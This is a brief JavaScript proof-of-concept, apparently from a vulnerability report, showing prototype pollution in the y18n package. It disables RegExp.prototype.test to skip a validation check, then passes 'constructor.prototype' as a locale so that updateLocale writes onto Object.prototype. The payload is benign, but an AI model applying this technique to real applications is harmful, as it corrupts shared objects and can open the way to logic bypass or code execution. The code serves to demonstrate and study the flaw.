RegExp.prototype.test = () => false;
const y18n = require('y18n')();
obj = {};
console.log({}.polluted);
y18n.setLocale('constructor.prototype');
y18n.updateLocale({ polluted: 'yes' });
console.log({}.polluted);